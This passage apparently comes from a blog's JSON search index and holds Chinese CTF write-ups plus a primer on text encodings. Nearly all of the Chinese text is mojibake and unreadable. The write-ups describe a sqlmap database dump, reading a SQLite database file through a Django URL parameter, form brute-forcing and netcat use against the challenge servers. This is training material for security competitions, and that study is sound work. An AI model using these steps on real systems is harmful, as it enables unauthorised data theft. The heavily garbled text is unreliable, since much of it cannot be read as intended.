ngle-minded_T/git/raw/master/images/N1.PNG) å®é™…æ“ä½œï¼š å°è¯•æ˜¯å¦ä¸ºsqlæ³¨å…¥ï¼šæŠ“åŒ…ï¼š åˆ©ç”¨sqlmap,å‘½ä»¤ï¼šsqlmap.py -r 1.txt â€“dbs çœ‹åˆ°æœ‰ä¸€ä¸ªnewsï¼Œå‘½ä»¤ï¼šsqlmap.py -r 1.txt -D news â€“dump å¾—åˆ°flagï¼","categories":[{"name":"Writeup","slug":"Writeup","permalink":"https://singlemindedt.github.io/categories/Writeup/"},{"name":"Web","slug":"Writeup/Web","permalink":"https://singlemindedt.github.io/categories/Writeup/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"ics-06","slug":"æ”»é˜²ä¸–ç•Œä¹‹Webé«˜æ‰‹è¿›é˜¶-ics-06","date":"2019-09-10T09:00:00.000Z","updated":"2019-12-30T05:24:32.339Z","comments":true,"path":"2019/09/10/æ”»é˜²ä¸–ç•Œä¹‹Webé«˜æ‰‹è¿›é˜¶-ics-06/","link":"","permalink":"https://singlemindedt.github.io/2019/09/10/æ”»é˜²ä¸–ç•Œä¹‹Webé«˜æ‰‹è¿›é˜¶-ics-06/","excerpt":"","text":"ics-06é¢˜ç›®æè¿°ï¼šäº‘å¹³å°æŠ¥è¡¨ä¸­å¿ƒæ”¶é›†äº†è®¾å¤‡ç®¡ç†åŸºç¡€æœåŠ¡çš„æ•°æ®ï¼Œä½†æ˜¯æ•°æ®è¢«åˆ é™¤äº†ï¼Œåªæœ‰ä¸€å¤„ç•™ä¸‹äº†å…¥ä¾µè€…çš„ç—•è¿¹ã€‚ å®é™…æ“ä½œï¼š è¿›å…¥é¡µé¢åªæœ‰æŠ¥è¡¨ä¸­å¿ƒå¯ä»¥ç‚¹å‡»ï¼Œæœ‰ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œå„ç§fuzzingï¼Œæ²¡æˆåŠŸï¼Œåæ¥æ‰çŸ¥é“ç›´æ¥çˆ†ç ´å°±è¡Œã€‚ã€‚ã€‚ çŸ¥è¯†ç‚¹è¡¥å……ï¼šå…³äºçˆ†ç ´","categories":[{"name":"Writeup","slug":"Writeup","permalink":"https://singlemindedt.github.io/categories/Writeup/"},{"name":"Web","slug":"Writeup/Web","permalink":"https://singlemindedt.github.io/categories/Writeup/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"Cat","slug":"æ”»é˜²ä¸–ç•Œä¹‹Webé«˜æ‰‹è¿›é˜¶-cat","date":"2019-09-09T16:00:00.000Z","updated":"2019-12-30T05:09:06.244Z","comments":true,"path":"2019/09/10/æ”»é˜²ä¸–ç•Œä¹‹Webé«˜æ‰‹è¿›é˜¶-cat/","link":"","permalink":"https://singlemindedt.github.io/2019/09/10/æ”»é˜²ä¸–ç•Œä¹‹Webé«˜æ‰‹è¿›é˜¶-cat/","excerpt":"","text":"Caté¢˜ç›®æè¿°ï¼šä»…ç»™å‡ºäº†è¿™æ ·ä¸€ä¸ªé¡µé¢ï¼š å®é™…æ“ä½œï¼šè¾“å…¥catï¼Œå¾—åˆ°ï¼š 123456PING cat.ad-world-198302431-4658.rancher.internal (10.42.197.21) 56(84) bytes of data.64 bytes from b4fccc7cf554 (10.42.197.21): icmp_seq=1 ttl=64 time=0.045 ms--- cat.ad-world-198302431-4658.rancher.internal ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 0.045/0.045/0.045/0.000 ms å¹¶åœ¨URLä¸­å¦‚æ­¤ä¼ å‚ï¼š 1http://111.198.29.45:35113/index.php?url=cat è¾“å…¥127.0.0.1ï¼š 123456PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.061 ms--- 127.0.0.1 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 0.061/0.061/0.061/0.000 ms å°è¯•ä½¿ç”¨å‘½ä»¤è¿æ¥ç¬¦/ç®¡é“å‘½ä»¤ï¼Œå‡è¢«å±è”½ï¼›ç›®å‰ä»…çŸ¥é“ï¼Œè¾“å…¥æ¡†é€šè¿‡ç”¨æˆ·è¾“å…¥è¿›è¡ŒGETæ–¹å¼ä¼ å‚ï¼›(æ­¤å¤„è¯·è·³è½¬æ–‡æœ« orz)é‚£ä¹ˆåªèƒ½ä»urlå…¥æ‰‹äº†ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å¯èƒ½çˆ†å‡ºä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯ï¼›æµ‹è¯•å‘ç°è¶…è¿‡ASCllå¯æ‰“å°å­—ç¬¦ä¹‹å¤–çš„urlç¼–ç éƒ½ä¼šæŠ¥é”™ï¼Œæ¯”å¦‚é”®å…¥http://111.198.29.45:35113/index.php?url=%8c ï¼š ç»™å‡ºæŠ¥é”™ä¿¡æ¯ï¼š å¯ä»¥æ˜æ˜¾çœ‹åˆ°ä½¿ç”¨çš„æ˜¯Djangoæ¡†æ¶ï¼› æŸ¥çœ‹é…ç½®æ–‡ä»¶ä¿¡æ¯ï¼šsettings.py åœ¨æŠ¥é”™ä¿¡æ¯ä¸­æœç´¢databaseï¼Œå‘ç°çš„åˆ°æœ‰å…³æ•°æ®åº“å†…å®¹ï¼š å‚è€ƒï¼š é€šè¿‡http://111.198.29.45:35113/index.php?url=@/opt/api/database.sqlite3 å¾—åˆ°æ•°æ®åº“å†…å®¹ï¼šæŸ¥æ‰¾ctfå…³é”®å­—ï¼š æºç é‡Œå°±æ˜¯GETå•Šï¼Œé‚£è¿™ä¸ªåˆæ˜¯å•¥ï¼Ÿï¼Ÿï¼Ÿpost?ï¼orz orz orz","categories":[{"name":"Writeup","slug":"Writeup","permalink":"https://singlemindedt.github.io/categories/Writeup/"},{"name":"Web","slug":"Writeup/Web","permalink":"https://singlemindedt.github.io/categories/Writeup/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"Win10å®‰è£…pygame","slug":"pygame_install","date":"2019-09-09T15:37:45.000Z","updated":"2019-12-17T16:21:40.141Z","comments":true,"path":"2019/09/09/pygame_install/","link":"","permalink":"https://singlemindedt.github.io/2019/09/09/pygame_install/","excerpt":"","text":"æ£€æŸ¥pipæ˜¯å¦å®‰è£…ï¼ŒæŸ¥çœ‹Pythonå®‰è£…ç‰ˆæœ¬ï¼› 2. 1pip install wheel 3. 1pip install Pygame==1.9.6","categories":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/categories/notes/"}],"tags":[{"name":"tools","slug":"tools","permalink":"https://singlemindedt.github.io/tags/tools/"}]},{"title":"Byte CTF å­—èŠ‚è·³åŠ¨ç½‘ç»œå®‰å…¨æ”»é˜²å¤§èµ›","slug":"Byte_CTF","date":"2019-09-09T08:36:00.000Z","updated":"2019-12-17T16:18:05.827Z","comments":true,"path":"2019/09/09/Byte_CTF/","link":"","permalink":"https://singlemindedt.github.io/2019/09/09/Byte_CTF/","excerpt":"","text":"betgameç»™äº†æç¤ºï¼Œnc 112.125.25.81 9999 çŸ¥è¯†è¡¥å……ï¼šncå³netcatï¼Œè¢«èª‰ä¸ºç½‘ç»œå®‰å…¨ç•Œçš„â€œç‘å£«å†›åˆ€â€ã€‚é€è¿‡ä½¿ç”¨TCPæˆ–UDPåè®®çš„ç½‘ç»œè¿æ¥å»è¯»å†™æ•°æ®ã€‚å®ƒè¢«è®¾è®¡æˆä¸€ä¸ªç¨³å®šçš„åé—¨(back-end)å·¥å…·ï¼Œèƒ½å¤Ÿç›´æ¥ç”±å…¶å®ƒç¨‹åºå’Œè„šæœ¬è½»æ¾é©±åŠ¨ã€‚åŒæ—¶ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„ç½‘ç»œè°ƒè¯•å’Œæ¢æµ‹å·¥å…·ï¼Œèƒ½å¤Ÿå»ºç«‹ä½ éœ€è¦çš„å‡ ä¹æ‰€æœ‰ç±»å‹çš„ç½‘ç»œè¿æ¥. ä½¿ç”¨ä¹‹å‰é¦–å…ˆæˆ‘ä»¬è¦å¼„æ˜ç™½netcatçš„å·¥ä½œåŸç†,å…¶å®netcatçš„åŸç†å¾ˆç®€å•,å®ƒå°±æ˜¯ä»ç½‘ç»œçš„ä¸€ç«¯è¯»å…¥æ•°æ®,ç„¶åè¾“å‡ºåˆ°ç½‘ç»œçš„å¦ä¸€ç«¯,å®ƒå¯ä»¥ä½¿ç”¨tcp å’Œudpåè®®.ä¹‹æ‰€ä»¥å«åšnetcat,å› ä¸ºå®ƒæ˜¯ç½‘ç»œä¸Šçš„cat,æƒ³è±¡ä¸€ä¸‹catçš„åŠŸèƒ½,è¯»å‡ºä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹,ç„¶åè¾“å‡ºåˆ°å±å¹•ä¸Š(é»˜è®¤çš„stdoutæ˜¯å±å¹•,å½“ç„¶å¯ä»¥é‡å®šå‘åˆ°å…¶ä»–åœ°æ–¹).netcatä¹Ÿæ˜¯å¦‚æ­¤,å®ƒè¯»å–ä¸€ç«¯çš„è¾“å…¥,ç„¶åä¼ é€åˆ°ç½‘ç»œçš„å¦ä¸€ç«¯ã€‚ncat/nc æ—¢æ˜¯ä¸€ä¸ªç«¯å£æ‰«æå·¥å…·ï¼Œä¹Ÿæ˜¯ä¸€æ¬¾å®‰å…¨å·¥å…·ï¼Œè¿˜èƒ½æ˜¯ä¸€æ¬¾ç›‘æµ‹å·¥å…·ï¼Œç”šè‡³å¯ä»¥åšä¸ºä¸€ä¸ªç®€å•çš„ TCP ä»£ç†ã€‚ç»†èŠ‚ å®é™…æ“ä½œï¼šå¯ä»¥å°†ncä½œä¸ºèŠå¤©å·¥å…·åˆ©ç”¨ï¼Œæœ¬åœ°server1ä¸Šä¼ nc 122.125.25.81 9999Server2å¯åŠ¨ç›‘å¬9999ç«¯å£ï¼šnc -lp 9999è‡³æ­¤å°±å¯ä»¥ç®€å•äº¤äº’ï¼Œæœ¬é¢˜æç¤ºè¦30æ¬¡å…¨èµ¢ï¼Œæ‰¾è§„å¾‹ï¼Œå¯¹åº”è¾“å…¥å³å¯ï¼› Linux ncå‘½ä»¤è¯¦è§£","categories":[{"name":"Writeup","slug":"Writeup","permalink":"https://singlemindedt.github.io/categories/Writeup/"}],"tags":[{"name":"Misc","slug":"Misc","permalink":"https://singlemindedt.github.io/tags/Misc/"}]},{"title":"CTFä¸­å¸¸è§ç¼–ç ","slug":"CTFä¸­å¸¸è§ç¼–ç æ€»ç»“","date":"2019-09-08T01:05:00.000Z","updated":"2019-12-17T13:45:20.583Z","comments":true,"path":"2019/09/08/CTFä¸­å¸¸è§ç¼–ç æ€»ç»“/","link":"","permalink":"https://singlemindedt.github.io/2019/09/08/CTFä¸­å¸¸è§ç¼–ç æ€»ç»“/","excerpt":"","text":"ASCIIç è¡¨ ASCIIï¼ˆAmerican Standard Code for Information Interchangeï¼Œç¾å›½ä¿¡æ¯äº¤æ¢æ ‡å‡†ä»£ç ï¼‰æ˜¯åŸºäºæ‹‰ä¸å­—æ¯çš„ä¸€å¥—ç”µè„‘ç¼–ç ç³»ç»Ÿï¼Œä¸»è¦ç”¨äºæ˜¾ç¤ºç°ä»£è‹±è¯­å’Œå…¶ä»–è¥¿æ¬§è¯­è¨€ã€‚å®ƒæ˜¯ç°ä»Šæœ€é€šç”¨çš„å•å­—èŠ‚ç¼–ç ç³»ç»Ÿï¼Œå¹¶ç­‰åŒäºå›½é™…æ ‡å‡†ISO/IEC 646ã€‚ ç¼–ç æ–¹æ³• å› ä¸º1ä½äºŒè¿›åˆ¶æ•°å¯ä»¥è¡¨ç¤ºï¼ˆ2^1=ï¼‰2ç§çŠ¶æ€ï¼š0ã€1ï¼›è€Œ2ä½äºŒè¿›åˆ¶æ•°å¯ä»¥è¡¨ç¤ºï¼ˆ2^2ï¼‰=4ç§çŠ¶æ€ï¼š00ã€01ã€10ã€11ï¼›ä¾æ¬¡ç±»æ¨ï¼Œ7ä½äºŒè¿›åˆ¶æ•°å¯ä»¥è¡¨ç¤ºï¼ˆ2^7=ï¼‰128ç§çŠ¶æ€ï¼Œæ¯ç§çŠ¶æ€éƒ½å”¯ä¸€åœ°ç¼–ä¸ºä¸€ä¸ª7ä½çš„äºŒè¿›åˆ¶ç ï¼Œå¯¹åº”ä¸€ä¸ªå­—ç¬¦ï¼ˆæˆ–æ§åˆ¶ç ï¼‰ï¼Œè¿™äº›ç å¯ä»¥æ’åˆ—æˆä¸€ä¸ªåè¿›åˆ¶åºå·0ï½127ã€‚æ‰€ä»¥ï¼Œ7ä½ASCIIç æ˜¯ç”¨ä¸ƒä½äºŒè¿›åˆ¶æ•°è¿›è¡Œç¼–ç çš„ï¼Œå¯ä»¥è¡¨ç¤º128ä¸ªå­—ç¬¦ã€‚ ç¬¬0ï½32å·åŠç¬¬127å·(å…±34ä¸ª)æ˜¯æ§åˆ¶å­—ç¬¦æˆ–é€šè®¯ä¸“ç”¨å­—ç¬¦ï¼Œå¦‚æ§åˆ¶ç¬¦ï¼šLFï¼ˆæ¢è¡Œï¼‰ã€CRï¼ˆå›è½¦ï¼‰ã€FFï¼ˆæ¢é¡µï¼‰ã€DELï¼ˆåˆ é™¤ï¼‰ã€BELï¼ˆæŒ¯é“ƒï¼‰ç­‰ï¼›é€šè®¯ä¸“ç”¨å­—ç¬¦ï¼šSOHï¼ˆæ–‡å¤´ï¼‰ã€EOTï¼ˆæ–‡å°¾ï¼‰ã€ACKï¼ˆç¡®è®¤ï¼‰ç­‰ï¼› ASCIIç å¤§è‡´å¯ä»¥åˆ†ä½œä¸‰éƒ¨åˆ†ç»„æˆï¼šç¬¬ä¸€éƒ¨åˆ†æ˜¯ï¼šASCIIéæ‰“å°æ§åˆ¶å­—ç¬¦ç¬¬äºŒéƒ¨åˆ†æ˜¯ï¼šASCIIæ‰“å°å­—ç¬¦ç¬¬ä¸‰éƒ¨åˆ†æ˜¯ï¼šæ‰©å±•ASCIIæ‰“å°å­—ç¬¦ ç¬¬ä¸€éƒ¨åˆ†ï¼šASCIIéæ‰“å°æ§åˆ¶å­—ç¬¦è¡¨ASCIIè¡¨ä¸Šçš„æ•°å­—0â€“31åˆ†é…ç»™äº†æ§åˆ¶å­—ç¬¦ï¼Œç”¨äºæ§åˆ¶åƒæ‰“å°æœºç­‰ä¸€äº›å¤–å›´è®¾å¤‡ã€‚ä¾‹å¦‚ï¼Œ12ä»£è¡¨æ¢é¡µ/æ–°é¡µåŠŸèƒ½ã€‚æ­¤å‘½ä»¤æŒ‡ç¤ºæ‰“å°æœºè·³åˆ°ä¸‹ä¸€é¡µçš„å¼€å¤´ã€‚ï¼ˆå‚è¯¦ASCIIç è¡¨ä¸­0-31ï¼‰ ç¬¬äºŒéƒ¨åˆ†ï¼šASCIIæ‰“å°å­—ç¬¦æ•°å­— 32â€“126 åˆ†é…ç»™äº†èƒ½åœ¨é”®ç›˜ä¸Šæ‰¾åˆ°çš„å­—ç¬¦ï¼Œå½“æ‚¨æŸ¥çœ‹æˆ–æ‰“å°æ–‡æ¡£æ—¶å°±ä¼šå‡ºç°ã€‚æ•°å­—127ä»£è¡¨ DELETE å‘½ä»¤ã€‚ï¼ˆå‚è¯¦ASCIIç è¡¨ä¸­32-127ï¼‰ ç¬¬ä¸‰éƒ¨åˆ†ï¼šæ‰©å±•ASCIIæ‰“å°å­—ç¬¦æ‰©å±•çš„ASCIIå­—ç¬¦æ»¡è¶³äº†å¯¹æ›´å¤šå­—ç¬¦çš„éœ€æ±‚ã€‚æ‰©å±•çš„ASCIIåŒ…å«ASCIIä¸­å·²æœ‰çš„128ä¸ªå­—ç¬¦ï¼ˆæ•°å­—0â€“32æ˜¾ç¤ºåœ¨ä¸‹å›¾ä¸­ï¼‰ï¼Œåˆå¢åŠ äº†128ä¸ªå­—ç¬¦ï¼Œæ€»å…±æ˜¯256ä¸ªã€‚å³ä½¿æœ‰äº†è¿™äº›æ›´å¤šçš„å­—ç¬¦ï¼Œè®¸å¤šè¯­è¨€è¿˜æ˜¯åŒ…å«æ— æ³•å‹ç¼©åˆ°256ä¸ªå­—ç¬¦ä¸­çš„ç¬¦å·ã€‚å› æ­¤ï¼Œå‡ºç°äº†ä¸€äº›ASCIIçš„å˜ä½“æ¥å›Šæ‹¬åœ°åŒºæ€§å­—ç¬¦å’Œç¬¦å·ã€‚ä¾‹å¦‚ï¼Œè®¸å¤šè½¯ä»¶ç¨‹åºæŠŠASCIIè¡¨ï¼ˆåˆç§°ä½œISO8859-1ï¼‰ç”¨äºåŒ—ç¾ã€è¥¿æ¬§ã€æ¾³å¤§åˆ©äºšå’Œéæ´²çš„è¯­è¨€ã€‚ ç‰¹å¾ç‰¹ç‚¹ï¼šç”¨1ä¸ªå­—èŠ‚çš„8ä½æ•°æ¥ç¼–ç è‹±æ–‡å­—ç¬¦é›†ï¼Œå³æ‰€æœ‰å­—æ¯æ•°å­—ç­‰è‹±æ–‡ç¬¦å·å¯ä»¥ç”¨äºŒè¿›åˆ¶æ•°ã€åè¿›åˆ¶ã€åå…­è¿›åˆ¶æ¥è¡¨ç¤ºã€‚ Unicodeç¼–ç Unicodeæ˜¯ä¸€ä¸ªç¼–ç æ–¹æ¡ˆï¼ŒUnicode æ˜¯ä¸ºäº†è§£å†³ä¼ ç»Ÿçš„å­—ç¬¦ç¼–ç æ–¹æ¡ˆçš„å±€é™è€Œäº§ç”Ÿçš„ï¼Œå®ƒä¸ºæ¯ç§è¯­è¨€ä¸­çš„æ¯ä¸ªå­—ç¬¦è®¾å®šäº†ç»Ÿä¸€å¹¶ä¸”å”¯ä¸€çš„äºŒè¿›åˆ¶ç¼–ç ï¼Œä»¥æ»¡è¶³è·¨è¯­è¨€ã€è·¨å¹³å°è¿›è¡Œæ–‡æœ¬è½¬æ¢ã€å¤„ç†çš„è¦æ±‚ã€‚Unicode ç¼–ç å…±æœ‰ä¸‰ç§å…·ä½“å®ç°ï¼Œåˆ†åˆ«ä¸ºutf-8,utf-16,utf-32ï¼Œå…¶ä¸­utf-8å ç”¨ä¸€åˆ°å››ä¸ªå­—èŠ‚ï¼Œutf-16å ç”¨äºŒæˆ–å››ä¸ªå­—èŠ‚ï¼Œutf-32å ç”¨å››ä¸ªå­—èŠ‚ã€‚ UTF-8UTF-8ä»¥å­—èŠ‚ä¸ºå•ä½å¯¹Unicodeè¿›è¡Œç¼–ç ã€‚ä»Unicodeåˆ°UTF-8çš„ç¼–ç æ–¹å¼å¦‚ä¸‹ï¼š|Unicodeç¼–ç (åå…­è¿›åˆ¶)|UTF-8 å­—èŠ‚æµ(äºŒè¿›åˆ¶)||:â€”â€”â€“:|:â€”â€”â€”â€”-:|| 000000-00007F | 0xxxxxxx || 000080-0007FF | 110xxxxx 10xxxxxx || 000800-00FFFF | 1110xxxx 10xxxxxx 10xxxxxx|| 010000-10FFFF | 11110xxx10xxxxxx10xxxxxx10xxxxxx|UTF-8çš„ç‰¹ç‚¹æ˜¯å¯¹ä¸åŒèŒƒå›´çš„å­—ç¬¦ä½¿ç”¨ä¸åŒé•¿åº¦çš„ç¼–ç ã€‚å¯¹äº0x00-0x7Fä¹‹é—´çš„å­—ç¬¦ï¼ŒUTF-8ç¼–ç ä¸ASCIIç¼–ç å®Œå…¨ç›¸åŒã€‚UTF-8ç¼–ç çš„æœ€å¤§é•¿åº¦æ˜¯4ä¸ªå­—èŠ‚ã€‚ä»ä¸Šè¡¨å¯ä»¥çœ‹å‡ºï¼Œ4å­—èŠ‚æ¨¡æ¿æœ‰21ä¸ªxï¼Œå³å¯ä»¥å®¹çº³21ä½äºŒè¿›åˆ¶æ•°å­—ã€‚Unicodeçš„æœ€å¤§ç ä½0x10FFFFä¹Ÿåªæœ‰21ä½ã€‚ ä¾‹1ï¼šâ€œæ±‰â€å­—çš„Unicodeç¼–ç æ˜¯0x6C49ã€‚0x6C49åœ¨0x0800-0xFFFFä¹‹é—´ï¼Œä½¿ç”¨3å­—èŠ‚æ¨¡æ¿ï¼š1110xxxx 10xxxxxx 10xxxxxxã€‚å°†0x6C49å†™æˆäºŒè¿›åˆ¶æ˜¯ï¼š0110 1100 0100 1001ï¼Œ ç”¨è¿™ä¸ªæ¯”ç‰¹æµä¾æ¬¡ä»£æ›¿æ¨¡æ¿ä¸­çš„xï¼Œå¾—åˆ°ï¼š11100110 10110001 10001001ï¼Œå³E6 B1 89ã€‚ ä¾‹2ï¼šUnicodeç¼–ç 0x20C30åœ¨0x010000-0x10FFFFä¹‹é—´ï¼Œä½¿ç”¨4å­—èŠ‚æ¨¡æ¿ï¼š11110xxx 10xxxxxx 10xxxxxx 10xxxxxxã€‚å°†0x20C30å†™æˆ21ä½äºŒè¿›åˆ¶æ•°å­—ï¼ˆä¸è¶³21ä½å°±åœ¨å‰é¢è¡¥0ï¼‰ï¼š0 0010 0000 1100 0011 0000ï¼Œç”¨è¿™ä¸ªæ¯”ç‰¹æµä¾æ¬¡ä»£æ›¿æ¨¡æ¿ä¸­çš„xï¼Œå¾—åˆ°ï¼š11110000 10100000 10110000 10110000ï¼Œå³F0 A0 B0 B0ã€‚ [UTF-8\\UTF-32]UTF-8\\UTF-32 Unicodeä¸€èˆ¬æœ‰å››ç§è¡¨ç¤ºå½¢å¼ &amp;#x [Hex] &#x0054;&#x0068;&#x0065; &amp;# [Decimal] &#00084;&#00104;&#00101; \\U [Hex] \\U0054\\U0068\\U0065 \\U+ [Hex] \\U+0054\\U+0068\\U+0065 ç‰¹å¾ç‰¹ç‚¹ï¼šå›½é™…æ ‡å‡†å­—ç¬¦ï¼Œå°†å…¨çƒçš„å„ç§è¯­è¨€çš„æ¯ä¸ªå­—ç¬¦å®šä¹‰ä¸€ä¸ªå”¯ä¸€çš„ç¼–ç ï¼Œä»¥æ»¡è¶³è·¨è¯­è¨€ã€è·¨å¹³å°æ–‡æœ¬ä¿¡æ¯çš„è½¬æ¢ï¼Œå½“ç¼–ç å’Œè§£ç çš„å­—ç¬¦é›†å‡ºç°ä¸ä¸€è‡´çš„æ—¶å€™å°±ä¼šå‡ºç°ä¹±ç ã€‚ URLç¼–ç urlç¼–ç æ˜¯ä¸€ç§æµè§ˆå™¨ç”¨æ¥æ‰“åŒ…è¡¨å•è¾“å…¥çš„æ ¼å¼ã€‚æµè§ˆå™¨ä»è¡¨å•ä¸­è·å–æ‰€æœ‰çš„nameå’Œå…¶ä¸­çš„å€¼ ï¼Œå°†å®ƒä»¬ä»¥name/valueå‚æ•°ç¼–ç ï¼ˆç§»å»é‚£äº›ä¸èƒ½ä¼ é€çš„å­—ç¬¦ï¼Œå°†æ•°æ®æ’è¡Œç­‰ç­‰ï¼‰ä½œä¸ºURLçš„ä¸€éƒ¨åˆ†æˆ–è€…åˆ†ç¦»åœ°å‘ç»™æœåŠ¡å™¨ã€‚ä¸ç®¡å“ªç§æƒ…å†µï¼Œåœ¨æœåŠ¡å™¨ç«¯çš„è¡¨å•è¾“å…¥æ ¼å¼æ ·å­è±¡è¿™æ ·ï¼štheName=Ichabod+Crane&amp;gender=male&amp;status=missing&amp; ;headless=yesURLåœ°å€ï¼ˆå¸¸è¯´ç½‘å€ï¼‰è§„å®šäº†å¸¸ç”¨åœ°æ•°å­—ï¼Œå­—æ¯å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œå¦å¤–ä¸€æ‰¹ä½œä¸ºç‰¹æ®Šç”¨æˆ·å­—ç¬¦ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ï¼ˆ/,:@ç­‰ï¼‰ï¼Œå‰©ä¸‹çš„å…¶å®ƒæ‰€æœ‰å­—ç¬¦å¿…é¡»é€šè¿‡%åè·Ÿä¸¤ä½åå…­è¿›åˆ¶æ•°æ¥æ›¿æ¢éASCIIå­—ç¬¦ã€‚ ç¼–ç è§„åˆ™URLç¼–ç éµå¾ªä¸‹åˆ—è§„åˆ™ï¼š æ¯å¯¹name/valueç”±&amp;ï¼›ç¬¦åˆ†å¼€ï¼›æ¯å¯¹æ¥è‡ªè¡¨å•çš„name/valueç”±=ç¬¦åˆ†å¼€ã€‚å¦‚æœç”¨æˆ·æ²¡æœ‰è¾“å…¥å€¼ç»™è¿™ä¸ªnameï¼Œé‚£ä¹ˆè¿™ä¸ªnameè¿˜æ˜¯å‡ºç°ï¼Œåªæ˜¯æ— å€¼ã€‚ä»»ä½•ç‰¹æ®Šçš„å­—ç¬¦ï¼ˆå°±æ˜¯é‚£äº›ä¸æ˜¯ç®€å•çš„ä¸ƒä½ASCIIï¼Œå¦‚æ±‰å­—ï¼‰å°†ä»¥ç™¾åˆ†ç¬¦%ç”¨åå…­è¿›åˆ¶ç¼–ç ï¼Œå½“ç„¶ä¹ŸåŒ…æ‹¬è±¡ =,&amp;ï¼›ï¼Œå’Œ % è¿™äº›ç‰¹æ®Šçš„å­—ç¬¦ã€‚å…¶å®urlç¼–ç å°±æ˜¯ä¸€ä¸ªå­—ç¬¦asciiç çš„åå…­è¿›åˆ¶ã€‚ä¸è¿‡ç¨å¾®æœ‰äº›å˜åŠ¨ï¼Œéœ€è¦åœ¨å‰é¢åŠ ä¸Šâ€œ%â€ã€‚æ¯”å¦‚ï¼š â€œ\\â€ï¼Œå®ƒçš„asciiç æ˜¯92ï¼Œ92çš„åå…­è¿›åˆ¶æ˜¯5cï¼Œæ‰€ä»¥â€œ\\â€çš„urlç¼–ç å°±æ˜¯%5cã€‚ ç©ºæ ¼å­—ç¬¦ï¼Œascii ç æ˜¯ 32ï¼Œå¯¹åº”16 è¿›åˆ¶æ˜¯â€˜20â€™ï¼Œé‚£ä¹ˆ urlencode ç¼–ç ç»“æœæ˜¯:%20ã€‚ URLç¼–ç å¹³æ—¶æ˜¯ç”¨ä¸åˆ°çš„ï¼Œå› ä¸ºIEä¼šè‡ªåŠ¨å°†è¾“å…¥åˆ°åœ°å€æ çš„éæ•°å­—å­—æ¯è½¬æ¢ä¸ºurlç¼–ç ã€‚æ›¾æœ‰äººæå‡ºæ•°æ®åº“åå­—é‡Œå¸¦ä¸Šâ€œ#â€ä»¥é˜²æ­¢è¢«ä¸‹è½½ï¼Œå› ä¸ºIEé‡åˆ°#å°±ä¼šå¿½ç•¥åé¢çš„å­—æ¯ã€‚ç ´è§£æ–¹æ³•å¾ˆç®€å•â€”â€”ç”¨urlç¼–ç %23æ›¿æ¢æ‰#ã€‚ ç‰¹å¾ç‰¹ç‚¹ï¼šå­—ç¬¦ASCIIç çš„åå…­è¿›åˆ¶ï¼Œå¹¶åœ¨å‰é¢åŠ ä¸Š% URLåŸç†ã€URLç¼–ç ã€URLç‰¹æ®Šå­—ç¬¦ base64ç¼–ç Base64æ˜¯ç½‘ç»œä¸Šæœ€å¸¸è§çš„ç”¨äºä¼ è¾“8Bitå­—èŠ‚ç çš„ç¼–ç æ–¹å¼ä¹‹ä¸€ï¼ŒBase64å°±æ˜¯ä¸€ç§åŸºäº64ä¸ªå¯æ‰“å°å­—ç¬¦æ¥è¡¨ç¤ºäºŒè¿›åˆ¶æ•°æ®çš„æ–¹æ³•ã€‚ Base64ç¼–ç æ˜¯ä»äºŒè¿›åˆ¶åˆ°å­—ç¬¦çš„è¿‡ç¨‹ï¼Œå¯ç”¨äºåœ¨HTTPç¯å¢ƒä¸‹ä¼ é€’è¾ƒé•¿çš„æ ‡è¯†ä¿¡æ¯ã€‚é‡‡ç”¨Base64ç¼–ç å…·æœ‰ä¸å¯è¯»æ€§ï¼Œéœ€è¦è§£ç åæ‰èƒ½é˜…è¯»ã€‚ Base64ç”±äºä»¥ä¸Šä¼˜ç‚¹è¢«å¹¿æ³›åº”ç”¨äºè®¡ç®—æœºçš„å„ä¸ªé¢†åŸŸï¼Œç„¶è€Œç”±äºè¾“å‡ºå†…å®¹ä¸­åŒ…æ‹¬ä¸¤ä¸ªä»¥ä¸Šâ€œç¬¦å·ç±»â€å­—ç¬¦ï¼ˆ+, /, =)ï¼Œä¸åŒçš„åº”ç”¨åœºæ™¯åˆåˆ†åˆ«ç ”åˆ¶äº†Base64çš„å„ç§â€œå˜ç§â€ã€‚ä¸ºç»Ÿä¸€å’Œè§„èŒƒåŒ–Base64çš„è¾“å‡ºï¼ŒBase62xè¢«è§†ä¸ºæ— ç¬¦å·åŒ–çš„æ”¹è¿›ç‰ˆæœ¬ã€‚ Base64è¦æ±‚æŠŠæ¯ä¸‰ä¸ª8Bitçš„å­—èŠ‚è½¬æ¢ä¸ºå››ä¸ª6Bitçš„å­—èŠ‚ï¼ˆ38 = 46 = 24ï¼‰ï¼Œç„¶åæŠŠ6Bitå†æ·»ä¸¤ä½é«˜ä½0ï¼Œç»„æˆå››ä¸ª8Bitçš„å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè½¬æ¢åçš„å­—ç¬¦ä¸²ç†è®ºä¸Šå°†è¦æ¯”åŸæ¥çš„é•¿1/3ã€‚ ç‰¹å¾ï¼šå¯†æ–‡ç”±64ä¸ªå­—ç¬¦(A-Z,a-z,0-9,+,/)ç»„æˆï¼Œæœ«å°¾å¯èƒ½ä¼šå‡ºç°1æˆ–2ä¸ªâ€™=â€™ æœ€å¤šæœ‰2ä¸ª è§„åˆ™ æŠŠ3ä¸ªå­—èŠ‚å˜æˆ4ä¸ªå­—èŠ‚ã€‚ æ¯76ä¸ªå­—ç¬¦åŠ ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚ æœ€åçš„ç»“æŸç¬¦ä¹Ÿè¦å¤„ç†ã€‚ 